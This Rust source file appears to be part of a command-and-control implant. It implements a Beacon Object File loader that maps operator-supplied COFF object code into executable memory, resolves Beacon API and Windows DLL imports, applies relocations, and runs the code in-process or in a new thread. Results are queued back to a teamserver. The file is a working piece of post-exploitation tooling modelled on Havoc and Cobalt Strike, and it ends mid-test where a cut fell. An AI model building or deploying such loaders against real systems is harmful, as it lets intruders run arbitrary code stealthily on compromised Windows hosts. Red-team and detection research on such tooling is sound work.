//! COFF/BOF (Beacon Object File) loader for inline execution.
//!
//! On Windows this module parses a COFF object file, maps its sections into
//! executable memory, resolves external imports (Beacon API functions and
//! dynamic DLL exports), applies relocations, and invokes the designated
//! entry point.
//!
//! On non-Windows targets the loader returns an error immediately — BOF
//! execution is only meaningful on a Windows host.

use std::sync::{Arc, Mutex};

use tracing::warn;

// ─── BOF output queue ─────────────────────────────────────────────────────

/// Thread-safe queue for BOF callbacks produced by background threads.
///
/// Background BOF threads push their [`BofCallback`]s into this queue; the
/// agent main loop drains it each iteration and forwards the callbacks to the
/// teamserver, preserving the `InlineExecute` callback contract.
pub type BofOutputQueue = Arc<Mutex<Vec<BofCallback>>>;

/// Create a new, empty [`BofOutputQueue`].
pub fn new_bof_output_queue() -> BofOutputQueue {
    Arc::new(Mutex::new(Vec::new()))
}

// ─── BOF callback sub-types (agent → server) ───────────────────────────────

/// Standard output produced by the BOF (via `BeaconPrintf`/`BeaconOutput`).
pub const BOF_CALLBACK_OUTPUT: u32 = 0x00;
/// Error output produced by the BOF.
pub const BOF_CALLBACK_ERROR: u32 = 0x0d;
/// An unhandled exception occurred during BOF execution.
pub const BOF_EXCEPTION: u32 = 1;
/// A required DLL export symbol could not be resolved.
pub const BOF_SYMBOL_NOT_FOUND: u32 = 2;
/// The BOF ran to completion successfully.
pub const BOF_RAN_OK: u32 = 3;
/// The COFF loader could not start the BOF at all.
pub const BOF_COULD_NOT_RUN: u32 = 4;

/// Result of a BOF execution attempt.
#[derive(Debug)]
pub struct BofResult {
    /// Callback entries to send back to the teamserver.
    pub callbacks: Vec<BofCallback>,
}

/// A single BOF callback to be sent to the teamserver.
#[derive(Debug)]
pub struct BofCallback {
    /// One of the `BOF_*` constants.
    pub callback_type: u32,
    /// Payload bytes for this callback (type-specific encoding).
    pub payload: Vec<u8>,
    /// The originating request ID from the teamserver task that triggered this
    /// BOF execution.  Must be preserved so threaded callbacks can be correlated
    /// with the correct task on the teamserver side.
    pub request_id: u32,
}

// ─── Beacon API types and callbacks (Windows) ──────────────────────────────

/// Beacon data parser — matches the Havoc `datap` struct layout from
/// `payloads/Demon/include/core/ObjectApi.h`.
///
/// BOFs allocate this on their stack and pass it to `BeaconDataParse` /
/// `BeaconDataInt` / etc.  The layout must be ABI-compatible with the C
/// definition so that BOF object code can operate on it directly.
#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct DataParser {
    /// Original buffer pointer (retained for the caller to free).
    pub original: *const u8,
    /// Current read cursor into the buffer.
    pub buffer: *const u8,
    /// Remaining bytes from `buffer` to end of data.
    pub length: i32,
    /// Total usable size (set once by `BeaconDataParse`).
    pub size: i32,
}

// Thread-local pointer to the `Vec<u8>` that collects BOF output for the
// current `coffee_execute` invocation.  Set before calling the BOF entry
// point and cleared afterward.
std::thread_local! {
    static BOF_OUTPUT_TLS: std::cell::Cell<*mut Vec<u8>> =
        const { std::cell::Cell::new(std::ptr::null_mut()) };
}

// ── Beacon data-parsing API ────────────────────────────────────────────────
//
// These `extern "C"` functions are called directly by BOF object code via
// the function-pointer map (FunMap).  Each matches the signature declared in
// Cobalt Strike / Havoc `beacon.h`.

/// `void BeaconDataParse(datap *parser, char *buffer, int size)`
///
/// Initialises a [`DataParser`].  The first 4 bytes of `buffer` are a
/// length prefix consumed here; the usable data starts at offset 4.
#[allow(dead_code, unsafe_code)]
unsafe extern "C" fn beacon_data_parse(parser: *mut DataParser, buffer: *const u8, size: i32) {
    if parser.is_null() || buffer.is_null() {
        return;
    }
    // SAFETY: caller guarantees `parser` is valid and writable.
    let p = unsafe { &mut *parser };
    p.original = buffer;
    p.buffer = unsafe { buffer.add(4) };
    p.length = size - 4;
    p.size = size - 4;
}

/// `int BeaconDataInt(datap *parser)`
///
/// Reads a little-endian 32-bit integer and advances the cursor.
#[allow(dead_code, unsafe_code)]
unsafe extern "C" fn beacon_data_int(parser: *mut DataParser) -> i32 {
    if parser.is_null() {
        return 0;
    }
    let p = unsafe { &mut *parser };
    if p.length < 4 {
        return 0;
    }
    // SAFETY: caller guarantees at least `p.length` readable bytes at `p.buffer`.
    let value = unsafe { std::ptr::read_unaligned(p.buffer.cast::<u32>()) };
    p.buffer = unsafe { p.buffer.add(4) };
    p.length -= 4;
    value as i32
}

/// `short BeaconDataShort(datap *parser)`
///
/// Reads a little-endian 16-bit integer and advances the cursor.
#[allow(dead_code, unsafe_code)]
unsafe extern "C" fn beacon_data_short(parser: *mut DataParser) -> i16 {
    if parser.is_null() {
        return 0;
    }
    let p = unsafe { &mut *parser };
    if p.length < 2 {
        return 0;
    }
    let value = unsafe { std::ptr::read_unaligned(p.buffer.cast::<u16>()) };
    p.buffer = unsafe { p.buffer.add(2) };
    p.length -= 2;
    value as i16
}

/// `char *BeaconDataExtract(datap *parser, int *size)`
///
/// Reads a 4-byte length prefix followed by that many bytes of data.
/// Returns a pointer to the data (inside the original buffer) and
/// optionally writes the length to `*size`.
#[allow(dead_code, unsafe_code)]
unsafe extern "C" fn beacon_data_extract(parser: *mut DataParser, size_out: *mut i32) -> *const u8 {
    if parser.is_null() {
        return std::ptr::null();
    }
    let p = unsafe { &mut *parser };
    if p.length < 4 {
        return std::ptr::null();
    }
    let length = unsafe { std::ptr::read_unaligned(p.buffer.cast::<u32>()) } as i32;
    p.buffer = unsafe { p.buffer.add(4) };
    let data = p.buffer;
    p.length -= 4;
    p.length -= length;
    p.buffer = unsafe { p.buffer.add(length as usize) };
    if !size_out.is_null() {
        unsafe { *size_out = length };
    }
    data
}

/// `int BeaconDataLength(datap *parser)`
///
/// Returns the number of bytes remaining in the parser.
#[allow(dead_code, unsafe_code)]
unsafe extern "C" fn beacon_data_length(parser: *mut DataParser) -> i32 {
    if parser.is_null() {
        return 0;
    }
    unsafe { (*parser).length }
}

// ── Beacon output API ──────────────────────────────────────────────────────

/// `void BeaconOutput(int type, char *data, int len)`
///
/// Appends raw bytes to the BOF output buffer.
#[allow(dead_code, unsafe_code)]
unsafe extern "C" fn beacon_output(_cb_type: i32, data: *const u8, len: i32) {
    if data.is_null() || len <= 0 {
        return;
    }
    let slice = unsafe { std::slice::from_raw_parts(data, len as usize) };
    BOF_OUTPUT_TLS.with(|cell| {
        let ptr = cell.get();
        if !ptr.is_null() {
            // SAFETY: ptr is set by coffee_execute to a valid &mut Vec<u8>.
            unsafe { (*ptr).extend_from_slice(slice) };
        }
    });
}

/// `void BeaconPrintf(int type, char *fmt, ...)`
///
/// Simplified stub: captures the format string verbatim (variadic
/// formatting is not available on stable Rust).  On x86-64 Windows the
/// caller manages the stack, so ignoring extra arguments is safe.
#[allow(dead_code, unsafe_code)]
unsafe extern "C" fn beacon_printf(_cb_type: i32, fmt: *const u8) {
    if fmt.is_null() {
        return;
    }
    // Walk until NUL to find the format string length.
    let mut len = 0usize;
    unsafe {
        while *fmt.add(len) != 0 {
            len += 1;
        }
    }
    let slice = unsafe { std::slice::from_raw_parts(fmt, len) };
    BOF_OUTPUT_TLS.with(|cell| {
        let ptr = cell.get();
        if !ptr.is_null() {
            unsafe { (*ptr).extend_from_slice(slice) };
        }
    });
}

// ── Utility APIs ───────────────────────────────────────────────────────────

/// `BOOL toWideChar(char *src, wchar_t *dst, int max)`
///
/// Converts an ASCII/ANSI string to UTF-16LE in-place.
#[allow(dead_code, unsafe_code)]
unsafe extern "C" fn to_wide_char(src: *const u8, dst: *mut u16, max: i32) -> i32 {
    if src.is_null() || dst.is_null() || max <= 0 {
        return 0;
    }
    let max = max as usize;
    for i in 0..max {
        let ch = unsafe { *src.add(i) };
        unsafe { *dst.add(i) = ch as u16 };
        if ch == 0 {
            return 1; // TRUE — success
        }
    }
    1 // TRUE
}

/// Resolve a `__imp_Beacon*` or `__imp_toWideChar` symbol name to the
/// corresponding Beacon API function pointer, or `None` if the name is not
/// a known Beacon API.
#[allow(dead_code)]
fn resolve_beacon_api(sym_name: &str) -> Option<u64> {
    // Strip the `__imp_` prefix to get the bare function name.
    let bare = sym_name.strip_prefix("__imp_")?;
    let addr: u64 = match bare {
        "BeaconDataParse" => beacon_data_parse as *const () as u64,
        "BeaconDataInt" => beacon_data_int as *const () as u64,
        "BeaconDataShort" => beacon_data_short as *const () as u64,
        "BeaconDataExtract" => beacon_data_extract as *const () as u64,
        "BeaconDataLength" => beacon_data_length as *const () as u64,
        "BeaconOutput" => beacon_output as *const () as u64,
        "BeaconPrintf" => beacon_printf as *const () as u64,
        "toWideChar" => to_wide_char as *const () as u64,
        _ => {
            // Unknown Beacon API — return None so caller can decide.
            return None;
        }
    };
    Some(addr)
}

// ─── Windows implementation ─────────────────────────────────────────────────

/// Execute a BOF (COFF object file) with the given entry function and arguments.
///
/// # Arguments
///
/// * `function_name` — Exported function to call (e.g. `"go"`).
/// * `object_data` — Raw COFF object file bytes.
/// * `arg_data` — Packed argument buffer for the BOF.
/// * `_threaded` — Whether to run in a dedicated thread (currently ignored;
///   all executions are synchronous).
///
/// Returns a [`BofResult`] containing one or more callbacks describing the
/// outcome.
#[cfg(windows)]
#[allow(unsafe_code)]
pub fn coffee_execute(
    function_name: &str,
    object_data: &[u8],
    arg_data: &[u8],
    _threaded: bool,
) -> BofResult {
    use std::collections::HashMap;

    // ── COFF structures ─────────────────────────────────────────────────

    const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
    const IMAGE_REL_AMD64_ADDR64: u16 = 1;
    const IMAGE_REL_AMD64_ADDR32NB: u16 = 3;
    const IMAGE_REL_AMD64_REL32: u16 = 4;

    const IMAGE_SCN_CNT_CODE: u32 = 0x0000_0020;
    const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
    const IMAGE_SCN_MEM_READ: u32 = 0x4000_0000;
    const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;

    const COFF_HEADER_SIZE: usize = 20;
    const SECTION_HEADER_SIZE: usize = 40;
    const SYMBOL_SIZE: usize = 18;

    #[repr(C)]
    #[derive(Debug, Clone, Copy)]
    struct CoffHeader {
        machine: u16,
        number_of_sections: u16,
        time_date_stamp: u32,
        pointer_to_symbol_table: u32,
        number_of_symbols: u32,
        size_of_optional_header: u16,
        characteristics: u16,
    }

    #[repr(C)]
    #[derive(Debug, Clone, Copy)]
    struct SectionHeader {
        name: [u8; 8],
        virtual_size: u32,
        virtual_address: u32,
        size_of_raw_data: u32,
        pointer_to_raw_data: u32,
        pointer_to_relocations: u32,
        _pointer_to_linenumbers: u32,
        number_of_relocations: u16,
        _number_of_linenumbers: u16,
        characteristics: u32,
    }

    #[repr(C)]
    #[derive(Debug, Clone, Copy)]
    struct CoffRelocation {
        virtual_address: u32,
        symbol_table_index: u32,
        reloc_type: u16,
    }

    fn read_u16_le(data: &[u8], offset: usize) -> u16 {
        u16::from_le_bytes([data[offset], data[offset + 1]])
    }

    fn read_u32_le(data: &[u8], offset: usize) -> u32 {
        u32::from_le_bytes([data[offset], data[offset + 1], data[offset + 2], data[offset + 3]])
    }

    fn read_i32_le(data: &[u8], offset: usize) -> i32 {
        i32::from_le_bytes([data[offset], data[offset + 1], data[offset + 2], data[offset + 3]])
    }

    // ── Parse COFF header ───────────────────────────────────────────────

    if object_data.len() < COFF_HEADER_SIZE {
        return BofResult {
            callbacks: vec![BofCallback {
                callback_type: BOF_COULD_NOT_RUN,
                payload: Vec::new(),
                request_id: 0,
            }],
        };
    }

    let header = CoffHeader {
        machine: read_u16_le(object_data, 0),
        number_of_sections: read_u16_le(object_data, 2),
        time_date_stamp: read_u32_le(object_data, 4),
        pointer_to_symbol_table: read_u32_le(object_data, 8),
        number_of_symbols: read_u32_le(object_data, 12),
        size_of_optional_header: read_u16_le(object_data, 16),
        characteristics: read_u16_le(object_data, 18),
    };

    if header.machine != IMAGE_FILE_MACHINE_AMD64 {
        warn!(machine = header.machine, "BOF: unsupported COFF machine type");
        return BofResult {
            callbacks: vec![BofCallback {
                callback_type: BOF_COULD_NOT_RUN,
                payload: Vec::new(),
                request_id: 0,
            }],
        };
    }

    let num_sections = header.number_of_sections as usize;
    let sec_table_offset = COFF_HEADER_SIZE + header.size_of_optional_header as usize;
    let sym_table_offset = header.pointer_to_symbol_table as usize;
    let num_symbols = header.number_of_symbols as usize;

    // ── Parse section headers ───────────────────────────────────────────

    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let off = sec_table_offset + i * SECTION_HEADER_SIZE;
        if off + SECTION_HEADER_SIZE > object_data.len() {
            return BofResult {
                callbacks: vec![BofCallback {
                    callback_type: BOF_COULD_NOT_RUN,
                    payload: Vec::new(),
                    request_id: 0,
                }],
            };
        }

        let mut name = [0u8; 8];
        name.copy_from_slice(&object_data[off..off + 8]);
        sections.push(SectionHeader {
            name,
            virtual_size: read_u32_le(object_data, off + 8),
            virtual_address: read_u32_le(object_data, off + 12),
            size_of_raw_data: read_u32_le(object_data, off + 16),
            pointer_to_raw_data: read_u32_le(object_data, off + 20),
            pointer_to_relocations: read_u32_le(object_data, off + 24),
            _pointer_to_linenumbers: read_u32_le(object_data, off + 28),
            number_of_relocations: read_u16_le(object_data, off + 32),
            _number_of_linenumbers: read_u16_le(object_data, off + 34),
            characteristics: read_u32_le(object_data, off + 36),
        });
    }

    // ── Read string table ───────────────────────────────────────────────

    let str_table_offset = sym_table_offset + num_symbols * SYMBOL_SIZE;
    let get_symbol_name = |sym_offset: usize| -> String {
        let name_bytes = &object_data[sym_offset..sym_offset + 8];
        let first_four = read_u32_le(name_bytes, 0);
        if first_four == 0 {
            // Long name — offset into string table
            let str_off = read_u32_le(name_bytes, 4) as usize;
            let start = str_table_offset + str_off;
            if start < object_data.len() {
                let end = object_data[start..]
                    .iter()
                    .position(|&b| b == 0)
                    .map_or(object_data.len(), |p| start + p);
                String::from_utf8_lossy(&object_data[start..end]).to_string()
            } else {
                String::new()
            }
        } else {
            // Short name — inline in 8-byte field
            let end = name_bytes.iter().position(|&b| b == 0).unwrap_or(8);
            String::from_utf8_lossy(&name_bytes[..end]).to_string()
        }
    };

    // ── Allocate memory for sections ────────────────────────────────────

    let mut section_bases: Vec<*mut u8> = Vec::with_capacity(num_sections);
    for sec in &sections {
        let size = std::cmp::max(sec.size_of_raw_data, sec.virtual_size) as usize;
        if size == 0 {
            section_bases.push(std::ptr::null_mut());
            continue;
        }

        // SAFETY: allocating RW memory via VirtualAlloc.
        let base = unsafe {
            windows_sys::Win32::System::Memory::VirtualAlloc(
                std::ptr::null(),
                size,
                windows_sys::Win32::System::Memory::MEM_COMMIT
                    | windows_sys::Win32::System::Memory::MEM_RESERVE,
                windows_sys::Win32::System::Memory::PAGE_READWRITE,
            )
        } as *mut u8;

        if base.is_null() {
            // Free already allocated sections
            for &prev_base in &section_bases {
                if !prev_base.is_null() {
                    unsafe {
                        windows_sys::Win32::System::Memory::VirtualFree(
                            prev_base.cast(),
                            0,
                            windows_sys::Win32::System::Memory::MEM_RELEASE,
                        );
                    }
                }
            }
            return BofResult {
                callbacks: vec![BofCallback {
                    callback_type: BOF_COULD_NOT_RUN,
                    payload: Vec::new(),
                    request_id: 0,
                }],
            };
        }

        // Copy section data
        if sec.size_of_raw_data > 0 && sec.pointer_to_raw_data > 0 {
            let src_start = sec.pointer_to_raw_data as usize;
            let src_end = src_start + sec.size_of_raw_data as usize;
            if src_end <= object_data.len() {
                unsafe {
                    std::ptr::copy_nonoverlapping(
                        object_data[src_start..src_end].as_ptr(),
                        base,
                        sec.size_of_raw_data as usize,
                    );
                }
            }
        }

        section_bases.push(base);
    }

    // ── Build symbol table ──────────────────────────────────────────────

    let mut symbol_values: Vec<u64> = Vec::with_capacity(num_symbols);
    let mut external_symbols: HashMap<usize, String> = HashMap::new();
    let mut entry_point: Option<*const u8> = None;

    let mut sym_idx = 0usize;
    while sym_idx < num_symbols {
        let sym_off = sym_table_offset + sym_idx * SYMBOL_SIZE;
        if sym_off + SYMBOL_SIZE > object_data.len() {
            break;
        }

        let sym_name = get_symbol_name(sym_off);
        let _value = read_u32_le(object_data, sym_off + 8);
        let section_number = read_u16_le(object_data, sym_off + 12) as i16;
        let _sym_type = read_u16_le(object_data, sym_off + 14);
        let storage_class = object_data[sym_off + 16];
        let aux_count = object_data[sym_off + 17] as usize;

        let address = if section_number > 0 {
            let sec_idx = (section_number - 1) as usize;
            if sec_idx < section_bases.len() && !section_bases[sec_idx].is_null() {
                let base = section_bases[sec_idx] as u64;
                base + _value as u64
            } else {
                0
            }
        } else {
            0
        };

        // Storage class 2 = IMAGE_SYM_CLASS_EXTERNAL
        if storage_class == 2 && section_number == 0 {
            external_symbols.insert(sym_idx, sym_name.clone());
        }

        // Check if this is our entry point
        if sym_name == function_name && section_number > 0 {
            entry_point = Some(address as *const u8);
        }

        symbol_values.push(address);

        // Skip aux symbols
        for _ in 0..aux_count {
            sym_idx += 1;
            symbol_values.push(0);
        }
        sym_idx += 1;
    }

    // ── Resolve external imports ────────────────────────────────────────

    // BOF output buffer — Beacon API callbacks (BeaconPrintf / BeaconOutput)
    // append to this Vec through the thread-local `BOF_OUTPUT_TLS`.
    let mut bof_output: Vec<u8> = Vec::new();
    let bof_arg_data: *const u8 = arg_data.as_ptr();
    let bof_arg_len: u32 = arg_data.len() as u32;

    // FunMap: IAT-like table of function pointers.  For every `__imp_*`
    // symbol the COFF object contains an indirect call (`call [rip+disp32]`)
    // that loads the function address from a pointer-sized slot.  We
    // allocate those slots here and resolve the symbol to the slot address
    // (not the function address itself).  This matches the Havoc CoffeeLdr
    // FunMap approach.
    let mut fun_map: Vec<u64> = Vec::with_capacity(external_symbols.len());

    let mut resolved_imports: HashMap<usize, u64> = HashMap::new();
    let mut missing_symbols: Vec<String> = Vec::new();

    for (&sym_idx_key, sym_name) in &external_symbols {
        if sym_name.starts_with("__imp_Beacon") || sym_name.starts_with("__imp_toWideChar") {
            // Beacon API — resolve to a real implementation.
            if let Some(func_addr) = resolve_beacon_api(sym_name) {
                let slot_index = fun_map.len();
                fun_map.push(func_addr);
                let slot_addr = unsafe { fun_map.as_ptr().add(slot_index) } as u64;
                resolved_imports.insert(sym_idx_key, slot_addr);
            } else {
                // Unknown Beacon API — warn but don't fail the whole BOF.
                warn!(symbol = %sym_name, "BOF: unimplemented Beacon API, resolving as no-op");
                let slot_index = fun_map.len();
                fun_map.push(0);
                let slot_addr = unsafe { fun_map.as_ptr().add(slot_index) } as u64;
                resolved_imports.insert(sym_idx_key, slot_addr);
            }
        } else if sym_name.starts_with("__imp_") {
            let import_name = &sym_name[6..]; // strip __imp_
            if let Some(dollar_pos) = import_name.find('$') {
                let dll_name = &import_name[..dollar_pos];
                let func_name = &import_name[dollar_pos + 1..];

                let dll_cstr = format!("{dll_name}\0");
                let func_cstr = format!("{func_name}\0");

                let module = unsafe {
                    windows_sys::Win32::System::LibraryLoader::LoadLibraryA(dll_cstr.as_ptr())
                };
                if module == 0 {
                    missing_symbols.push(sym_name.clone());
                    continue;
                }

                let proc = unsafe {
                    windows_sys::Win32::System::LibraryLoader::GetProcAddress(
                        module,
                        func_cstr.as_ptr(),
                    )
                };
                if let Some(addr) = proc {
                    let slot_index = fun_map.len();
                    fun_map.push(addr as u64);
                    let slot_addr = unsafe { fun_map.as_ptr().add(slot_index) } as u64;
                    resolved_imports.insert(sym_idx_key, slot_addr);
                } else {
                    missing_symbols.push(format!("{dll_name}!{func_name}"));
                }
            } else {
                // Try resolving from ntdll or kernel32
                for dll in &["ntdll.dll\0", "kernel32.dll\0"] {
                    let module = unsafe {
                        windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(dll.as_ptr())
                    };
                    if module == 0 {
                        continue;
                    }
                    let func_cstr = format!("{import_name}\0");
                    let proc = unsafe {
                        windows_sys::Win32::System::LibraryLoader::GetProcAddress(
                            module,
                            func_cstr.as_ptr(),
                        )
                    };
                    if let Some(addr) = proc {
                        let slot_index = fun_map.len();
                        fun_map.push(addr as u64);
                        let slot_addr = unsafe { fun_map.as_ptr().add(slot_index) } as u64;
                        resolved_imports.insert(sym_idx_key, slot_addr);
                        break;
                    }
                }
                if !resolved_imports.contains_key(&sym_idx_key) {
                    missing_symbols.push(sym_name.clone());
                }
            }
        }
    }

    // Report missing symbols
    if !missing_symbols.is_empty() {
        let mut callbacks = Vec::new();
        for sym in &missing_symbols {
            let mut payload = Vec::new();
            let sym_bytes = sym.as_bytes();
            payload.extend_from_slice(&(sym_bytes.len() as u32).to_le_bytes());
            payload.extend_from_slice(sym_bytes);
            callbacks.push(BofCallback {
                callback_type: BOF_SYMBOL_NOT_FOUND,
                payload,
                request_id: 0,
            });
        }
        callbacks.push(BofCallback {
            callback_type: BOF_COULD_NOT_RUN,
            payload: Vec::new(),
            request_id: 0,
        });

        // Cleanup
        for (i, &base) in section_bases.iter().enumerate() {
            if !base.is_null() {
                unsafe {
                    windows_sys::Win32::System::Memory::VirtualFree(
                        base.cast(),
                        0,
                        windows_sys::Win32::System::Memory::MEM_RELEASE,
                    );
                }
            }
        }

        return BofResult { callbacks };
    }

    // ── Apply relocations ───────────────────────────────────────────────

    for (sec_idx, sec) in sections.iter().enumerate() {
        if sec.number_of_relocations == 0 || section_bases[sec_idx].is_null() {
            continue;
        }

        let reloc_offset = sec.pointer_to_relocations as usize;
        for r in 0..sec.number_of_relocations as usize {
            let roff = reloc_offset + r * 10; // each relocation entry is 10 bytes
            if roff + 10 > object_data.len() {
                break;
            }

            let reloc = CoffRelocation {
                virtual_address: read_u32_le(object_data, roff),
                symbol_table_index: read_u32_le(object_data, roff + 4),
                reloc_type: read_u16_le(object_data, roff + 8),
            };

            let sym_index = reloc.symbol_table_index as usize;
            let target_addr = if let Some(&imp_addr) = resolved_imports.get(&sym_index) {
                imp_addr
            } else if sym_index < symbol_values.len() {
                symbol_values[sym_index]
            } else {
                continue;
            };

            let patch_addr = unsafe { section_bases[sec_idx].add(reloc.virtual_address as usize) };

            match reloc.reloc_type {
                IMAGE_REL_AMD64_REL32 => {
                    // RIP-relative 32-bit displacement
                    let rip = patch_addr as u64 + 4; // next instruction
                    let delta = target_addr.wrapping_sub(rip) as i32;
                    unsafe {
                        std::ptr::copy_nonoverlapping(delta.to_le_bytes().as_ptr(), patch_addr, 4);
                    }
                }
                IMAGE_REL_AMD64_ADDR64 => unsafe {
                    std::ptr::copy_nonoverlapping(
                        target_addr.to_le_bytes().as_ptr(),
                        patch_addr,
                        8,
                    );
                },
                IMAGE_REL_AMD64_ADDR32NB => {
                    // Image-relative 32-bit address (no base)
                    let delta = target_addr as i32;
                    unsafe {
                        std::ptr::copy_nonoverlapping(delta.to_le_bytes().as_ptr(), patch_addr, 4);
                    }
                }
                _ => {
                    // Also handle REL32_1 through REL32_5 (reloc types 5-9)
                    if reloc.reloc_type >= 5 && reloc.reloc_type <= 9 {
                        let extra = (reloc.reloc_type - 4) as u64;
                        let rip = patch_addr as u64 + 4 + extra;
                        let delta = target_addr.wrapping_sub(rip) as i32;
                        unsafe {
                            std::ptr::copy_nonoverlapping(
                                delta.to_le_bytes().as_ptr(),
                                patch_addr,
                                4,
                            );
                        }
                    }
                }
            }
        }
    }

    // ── Set executable memory protections ───────────────────────────────

    for (i, sec) in sections.iter().enumerate() {
        if section_bases[i].is_null() {
            continue;
        }
        let size = std::cmp::max(sec.size_of_raw_data, sec.virtual_size) as usize;
        if size == 0 {
            continue;
        }

        let is_exec = sec.characteristics & (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE) != 0;
        let is_write = sec.characteristics & IMAGE_SCN_MEM_WRITE != 0;

        let prot = match (is_exec, is_write) {
            (true, true) => windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
            (true, false) => windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ,
            (false, true) => windows_sys::Win32::System::Memory::PAGE_READWRITE,
            (false, false) => windows_sys::Win32::System::Memory::PAGE_READONLY,
        };

        let mut old_prot: u32 = 0;
        unsafe {
            windows_sys::Win32::System::Memory::VirtualProtect(
                section_bases[i].cast(),
                size,
                prot,
                &mut old_prot,
            );
        }
    }

    // ── Execute the entry point ─────────────────────────────────────────

    // Install the output buffer into TLS so Beacon API callbacks can
    // append output during execution.
    BOF_OUTPUT_TLS.with(|cell| cell.set(&mut bof_output as *mut Vec<u8>));

    let callbacks = if let Some(ep) = entry_point {
        // BOF entry: void go(char* args, int arg_len)
        type BofEntry = unsafe extern "C" fn(*const u8, u32);
        let func: BofEntry = unsafe { std::mem::transmute(ep) };

        // Use SEH-style guard (simplified: catch panics)
        let exec_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| unsafe {
            func(bof_arg_data, bof_arg_len);
        }));

        match exec_result {
            Ok(()) => {
                let mut cbs = Vec::new();
                // If there's captured output, send it
                if !bof_output.is_empty() {
                    let mut payload = Vec::new();
                    payload.extend_from_slice(&(bof_output.len() as u32).to_le_bytes());
                    payload.extend_from_slice(&bof_output);
                    cbs.push(BofCallback {
                        callback_type: BOF_CALLBACK_OUTPUT,
                        payload,
                        request_id: 0,
                    });
                }
                cbs.push(BofCallback {
                    callback_type: BOF_RAN_OK,
                    payload: Vec::new(),
                    request_id: 0,
                });
                cbs
            }
            Err(_) => {
                vec![BofCallback {
                    callback_type: BOF_EXCEPTION,
                    payload: {
                        let mut p = Vec::new();
                        p.extend_from_slice(&0xE06D7363u32.to_le_bytes()); // C++ exception code
                        p.extend_from_slice(&(ep as u64).to_le_bytes()); // address
                        p
                    },
                    request_id: 0,
                }]
            }
        }
    } else {
        warn!(function_name, "BOF: entry point not found");
        vec![BofCallback { callback_type: BOF_COULD_NOT_RUN, payload: Vec::new(), request_id: 0 }]
    };

    // ── Cleanup ─────────────────────────────────────────────────────────

    for &base in &section_bases {
        if !base.is_null() {
            unsafe {
                windows_sys::Win32::System::Memory::VirtualFree(
                    base.cast(),
                    0,
                    windows_sys::Win32::System::Memory::MEM_RELEASE,
                );
            }
        }
    }

    // Clear TLS pointer — the bof_output Vec is about to go out of scope.
    BOF_OUTPUT_TLS.with(|cell| cell.set(std::ptr::null_mut()));

    // Keep fun_map alive until after cleanup (its slots were referenced
    // during BOF execution via the FunMap pointers).
    drop(fun_map);

    BofResult { callbacks }
}

// ─── Non-Windows stub ───────────────────────────────────────────────────────

/// On non-Windows targets, BOF execution is unsupported.
#[cfg(not(windows))]
pub fn coffee_execute(
    _function_name: &str,
    _object_data: &[u8],
    _arg_data: &[u8],
    _threaded: bool,
) -> BofResult {
    warn!("BOF execution is only supported on Windows");
    BofResult {
        callbacks: vec![BofCallback {
            callback_type: BOF_COULD_NOT_RUN,
            payload: Vec::new(),
            request_id: 0,
        }],
    }
}

// ─── Threaded BOF execution ─────────────────────────────────────────────────

/// Parameters transferred to a BOF thread created by [`coffee_execute_threaded`].
#[cfg(windows)]
struct BofThreadArgs {
    function_name: String,
    object_data: Vec<u8>,
    arg_data: Vec<u8>,
    output_queue: BofOutputQueue,
    request_id: u32,
}

/// Thread entry point for threaded BOF execution.
///
/// # Safety
///
/// `param` must point to a `Box<BofThreadArgs>` that was leaked by
/// [`coffee_execute_threaded`].  Ownership is reclaimed here.
#[cfg(windows)]
#[allow(unsafe_code)]
unsafe extern "system" fn bof_thread_entry(param: *mut std::ffi::c_void) -> u32 {
    // SAFETY: param is a Box<BofThreadArgs> leaked in coffee_execute_threaded.
    let args = unsafe { Box::from_raw(param.cast::<BofThreadArgs>()) };
    let result = coffee_execute(&args.function_name, &args.object_data, &args.arg_data, false);

    // Stamp the originating request ID on every callback so the teamserver can
    // correlate threaded BOF results with the correct task.
    let callbacks: Vec<BofCallback> = result
        .callbacks
        .into_iter()
        .map(|mut cb| {
            cb.request_id = args.request_id;
            cb
        })
        .collect();

    // Forward BOF callbacks to the shared output queue so the main agent loop
    // can drain and send them to the teamserver on the next iteration.
    if let Ok(mut queue) = args.output_queue.lock() {
        queue.extend(callbacks);
    }

    0
}

/// Spawn a BOF in a new Windows thread and return the thread `HANDLE`.
///
/// The returned handle (as `isize`) should be registered in a
/// [`crate::job::JobStore`] so the operator can suspend, resume, or kill the
/// thread via `CommandJob`.  Ownership of the handle is transferred to the
/// caller; close it (or let `JobStore::kill` do so) when the job is done.
///
/// BOF callbacks produced by the thread are pushed into `output_queue` so the
/// main agent loop can drain and forward them to the teamserver.
///
/// Returns `None` if `CreateThread` fails; in that case the argument memory is
/// reclaimed and no thread is started.
#[cfg(windows)]
#[allow(unsafe_code)]
pub fn coffee_execute_threaded(
    function_name: String,
    object_data: Vec<u8>,
    arg_data: Vec<u8>,
    output_queue: BofOutputQueue,
    request_id: u32,
) -> Option<isize> {
    let args =
        Box::new(BofThreadArgs { function_name, object_data, arg_data, output_queue, request_id });
    let param = Box::into_raw(args).cast::<std::ffi::c_void>();

    // SAFETY: param points to a valid Box<BofThreadArgs>; the thread
    // reclaims it via Box::from_raw in bof_thread_entry.
    let handle = unsafe {
        windows_sys::Win32::System::Threading::CreateThread(
            std::ptr::null(),
            0,
            Some(bof_thread_entry),
            param,
            0,
            std::ptr::null_mut(),
        )
    };

    if handle == 0 {
        // CreateThread failed — reclaim to prevent a memory leak.
        // SAFETY: param still points to our Box<BofThreadArgs>, thread was not started.
        unsafe { drop(Box::from_raw(param.cast::<BofThreadArgs>())) };
        None
    } else {
        Some(handle)
    }
}

/// Non-Windows stub: threaded BOF execution is unsupported.
///
/// Always returns `None`; callers should fall back to synchronous execution.
#[cfg(not(windows))]
pub fn coffee_execute_threaded(
    _function_name: String,
    _object_data: Vec<u8>,
    _arg_data: Vec<u8>,
    _output_queue: BofOutputQueue,
    _request_id: u32,
) -> Option<isize> {
    warn!("Threaded BOF execution is only supported on Windows");
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_object_returns_could_not_run() {
        let result = coffee_execute("go", &[], &[], false);
